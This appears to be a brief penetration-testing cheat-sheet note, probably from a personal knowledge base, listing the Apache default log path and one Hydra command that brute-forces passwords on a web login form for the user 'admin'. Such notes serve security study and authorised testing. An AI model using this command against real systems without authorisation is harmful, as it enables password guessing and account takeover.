---
id: tools-apache2
tags: ["kali", "tool", "exfiltration", "secure"]
created: 2023-01-12 11:56
---
# tools-hydra

backlinks: [[]]

sources:

---

- default log path - /var/log/apache2/

```shell
# username is known, custom password list
sudo hydra -l admin -P passwords.txt $IP http-post-form "/login.php:username=admin&password=^PASS^&debug=0:Login Failed" -v


```
